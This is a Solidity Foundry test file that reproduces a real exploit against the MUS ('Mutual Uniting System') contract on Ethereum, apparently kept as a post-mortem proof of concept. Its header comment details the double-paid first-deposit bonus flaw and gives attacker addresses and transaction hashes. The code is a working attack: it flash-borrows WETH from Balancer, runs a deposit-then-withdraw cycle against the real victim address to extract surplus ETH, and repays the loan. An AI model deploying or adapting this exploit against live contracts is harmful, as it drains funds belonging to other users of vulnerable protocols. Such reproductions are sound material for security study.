// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "../basetest.sol";

// Mutual Uniting System (MUS) - deposit() pays a first-deposit bonus twice: once as an immediate ETH
// refund to the caller, and again as MUS allocation that withdraw() later redeems for ETH, with no cap
// tying total ETH paid out to the ETH actually deposited. A single deposit-then-withdraw from a fresh
// address therefore returns more ETH than was put in. Ethereum.
//
// Sample txs (attacker cycled 16 fresh sub-addresses per tx; all three are in block 26087602):
//   0xfe28118e48c64b275b587c90da472fc13b8c3dbed9d3cded1e18c1e7a7fc0392  (16 cycles)
//   0xaa172fcaa4800b14826daed1a78c9d6dcd8f26ae45ce5f31786d55768b709ec6  (16 cycles)
//   0x905af4e8cdaf32c183605358c97181e9ad57393bd4ed1d945baf6d6eebe983fe
// Attacker EOA    : 0x1a083ADf234a8f67ad65A9B9B616853ACf5998E5
// Attack contract : 0xD1a7A2A3c27962E80E9B6B46D54094F93267e988 (drives the fresh sub-address proxies)
// Victim (MUS)    : 0x9bdf81e6066d32764b7e75a1b5577237e06d9364 (unverified - reversed from bytecode;
//                   symbol "MUS", name "Mutual Uniting System", 14 decimals)
//
// ROOT CAUSE (confirmed against the decompiled bytecode + the real call trace):
//   deposit() and withdraw(uint256,uint256,bool) carry NO owner/admin/caller gate - any address can call
//   them (verified: no `require(caller == ...)` anywhere in either function). For a FRESH depositor,
//   deposit{value: D}() does two things with the same first-deposit bonus:
//     (a) immediately CALLs ETH back to the caller (the bonus refund, R), and
//     (b) credits the caller a MUS allocation that withdraw() can redeem for ETH (W).
//   withdraw() then pays W without ever capping (R + W) at D. Net per fresh cycle: R + W - D > 0, funded
//   out of the pool's standing ETH. The attacker scaled it by repeating from many fresh addresses.
//
// REAL CYCLE 1 (from the trace of the first sample tx, exact wei):
//   deposit value D        = 53.355703172210117028 ETH
//   bonus refund R (in dep)= 32.253522567601017211 ETH   (MUS -> caller, inside deposit())
//   withdraw payout W      = 21.502348378400678141 ETH   (MUS -> caller, inside withdraw())
//   R + W                  = 53.755870946001695352 ETH  >  D
//   net over-extraction    =  0.400167773791578324 ETH   per cycle
//   The first tx ran 16 such cycles from 16 fresh sub-addresses (deposit amounts shrink each cycle), summing
//   to ~5.9476 ETH by the per-cycle R+W-D measure; the MUS pool's own standing ETH (5.335 ETH at 26087601)
//   was fully drained to 0 across the attack block, the rest of each payout coming from same-block legit
//   deposits the pack redistributes. The reported ~$36.9k is the whole campaign across many txs/addresses and
//   is NOT cleanly derivable from these 3 samples; the honest, exactly-reproduced figure is the per-cycle net.
//   Each cycle is self-contained within one call (deposit then withdraw back to back, no multi-tx sequence
//   per address), but the payout side DOES depend on the current pack round being funded: at the plain
//   pre-block state (26087601) a single cycle nets a loss and deposit() even reverts, because the pack that
//   makes withdraw pay out was filled by legit deposits earlier in the attack block. MUS's standing ETH is
//   5.335155 at the parent block 26087601 but 13.854604 at the exact pre-state of the attack tx (idx 138) -
//   that delta is the same-block deposits the pack redistributes.
//
// WORKING CAPITAL: the real attack contract (0xD1a7...e988) ALSO borrowed its deposit capital as a Balancer
// V2 flash loan (0 fee) - VAULT.flashLoan (selector 0x5c38449e) is the top-level call of the real tx, the 16
// deposit/withdraw cycles run inside receiveFlashLoan, and the net is forwarded to the EOA at the end
// (confirmed in the on-chain call trace). This PoC mirrors that exactly: one Balancer flash loan, one
// fresh-address cycle, repaid in the same tx, so the leftover balance is precisely the net over-extraction
// drained from the MUS pool.
//
// OFFLINE REPRODUCTION (why not a literal fork-at-tx): Foundry's createSelectFork(url, FORK_AT_TX) must
// replay every earlier transaction in block 26087602, which includes EIP-4844 blob txs that this revm build
// rejects ("blob gas price (7011916170825372) is greater than max fee per blob gas (1000000000)" - the
// block's excessBlobGas 182713466 makes revm compute a ~7e15 wei blob base fee). So a literal fork-at-tx is
// NOT reproducible here. Instead the committed anvil_state.json is the EXACT pre-tx-138 state captured via
// debug_traceTransaction(FORK_AT_TX, {tracer:"prestateTracer"}) - it already contains the funded pack round
// (MUS = 13.854604 ETH, 287 storage slots) with no blob replay. Forking that state at block 26087602 and
// running ONE fresh-address cycle reproduces real cycle 1 to the wei (net 0.400167773791578324 ETH). This is
// a faithful replay of the real pre-attack state, NOT a hand-primed reconstruction.

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function transfer(address, uint256) external returns (bool);
    function withdraw(uint256) external; // WETH unwrap
    function deposit() external payable; // WETH wrap
}

interface IMUS {
    function deposit() external payable;
    function withdraw(uint256 pid, uint256 amount, bool withdrawRewards) external;
    function balanceOf(address) external view returns (uint256);
}

interface IBalancerVault {
    function flashLoan(address recipient, address[] calldata tokens, uint256[] calldata amounts, bytes calldata userData)
        external;
}

contract MUS_exp is BaseTestWithBalanceLog {
    IMUS constant MUS = IMUS(0x9bDF81e6066D32764b7E75a1b5577237e06d9364);
    IERC20 constant WETH = IERC20(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
    IBalancerVault constant VAULT = IBalancerVault(0xBA12222222228d8Ba445958a75a0704d566BF2C8);

    uint256 constant DEPOSIT = 53_355_703_172210117028; // real cycle-1 deposit amount (wei)
    // First sample tx (idx 138 in block 26087602). The exploit's profitability depends on the "pack" round
    // state as it stood right before this tx, which is set up by legit txs earlier in the same block - a plain
    // block-26087601 fork does NOT reproduce it (deposit() reverts; a single cycle there nets a loss). The
    // committed offline state is the pre-tx-138 snapshot (prestateTracer); a literal createSelectFork-at-tx is
    // blocked by blob-tx replay (see header "OFFLINE REPRODUCTION").
    bytes32 constant FORK_AT_TX = 0xfe28118e48c64b275b587c90da472fc13b8c3dbed9d3cded1e18c1e7a7fc0392;
    uint256 constant FORK_BLOCK = 26087602; // offline anvil_state = prestateTracer snapshot of pre-tx-138 (pack funded)

    function setUp() public {
        // Offline form: anvil --load-state serves the EXACT pre-tx-138 state of the attack tx - captured via
        // debug_traceTransaction(FORK_AT_TX, {tracer:"prestateTracer"}) and baked into block 26087602. That
        // snapshot already holds the funded "pack" round (MUS = 13.854604 ETH, 287 slots) built by the earlier
        // same-block deposits; no blob-tx replay is needed (see header). A plain archive fork of the parent
        // 26087601 would NOT reproduce it - deposit() reverts and a single cycle nets a loss there.
        vm.createSelectFork("http://127.0.0.1:8545", FORK_BLOCK);
        fundingToken = address(0); // profit realized in native ETH
    }

    function testExploit() public balanceLog {
        // Flash-borrow the working capital (WETH) from Balancer (0 fee); the cycle runs inside the callback.
        address[] memory tokens = new address[](1);
        tokens[0] = address(WETH);
        uint256[] memory amounts = new uint256[](1);
        amounts[0] = DEPOSIT;
        VAULT.flashLoan(address(this), tokens, amounts, "");

        emit log_named_decimal_uint("net ETH extracted (one cycle)", address(this).balance, 18);
    }

    function receiveFlashLoan(
        address[] calldata,
        uint256[] calldata amounts,
        uint256[] calldata,
        bytes calldata
    ) external {
        require(msg.sender == address(VAULT), "only vault");
        WETH.withdraw(amounts[0]); // unwrap to ETH

        // --- one exploit cycle from this fresh address ---
        uint256 before = address(this).balance; // == DEPOSIT (borrowed)
        MUS.deposit{value: DEPOSIT}(); // pays the bonus refund R back to us here AND mints a MUS allocation
        uint256 minted = MUS.balanceOf(address(this)); // the double-counted allocation
        MUS.withdraw(0, minted, true); // redeems it for ETH (W), uncapped vs D
        uint256 got = address(this).balance; // == before + R + W - D  (net > before)

        // Over-extraction pulled out of the MUS pool in this single cycle.
        uint256 net = got - before;
        assertApproxEqRel(net, 0.400167773791578324e18, 0.02e18, "per-cycle over-extraction off");
        assertGt(got, before, "cycle did not net a profit");

        // Repay the flash loan (Balancer fee is 0): rewrap DEPOSIT ETH and return it to the Vault.
        WETH.deposit{value: DEPOSIT}();
        WETH.transfer(address(VAULT), amounts[0]);
    }

    receive() external payable {}
}
